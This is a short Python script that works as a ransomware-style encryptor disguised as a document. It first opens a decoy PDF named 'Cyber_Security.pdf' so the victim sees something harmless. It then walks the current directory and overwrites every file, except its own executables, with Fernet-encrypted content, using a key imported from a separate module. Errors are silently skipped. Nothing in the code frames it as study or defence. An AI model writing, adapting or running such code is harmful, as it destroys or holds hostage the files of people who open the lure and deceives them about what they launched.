from cryptography.fernet import Fernet
import os
import subprocess
import key


def openAddedFile():
    dir_path = os.path.dirname(os.path.realpath(__file__))
    dir_Path = dir_path+"\\"+"Cyber_Security.pdf"
    subprocess.Popen(dir_Path, shell=True)
    
openAddedFile()


files = []


for file in os.listdir():
    if file == "Cyber_Security.exe" or file == "Cyber_Security_2.exe":
        continue
    if os.path.isfile(file):
        files.append(file)


for file in files:
    try:
        with open(file, "rb") as the_File:
            contents = the_File.read()
        contents_encrypted = Fernet(key.key).encrypt(contents)

        with open(file,"wb") as the_File:
            the_File.write(contents_encrypted)     
             
    except Exception as e:
        continue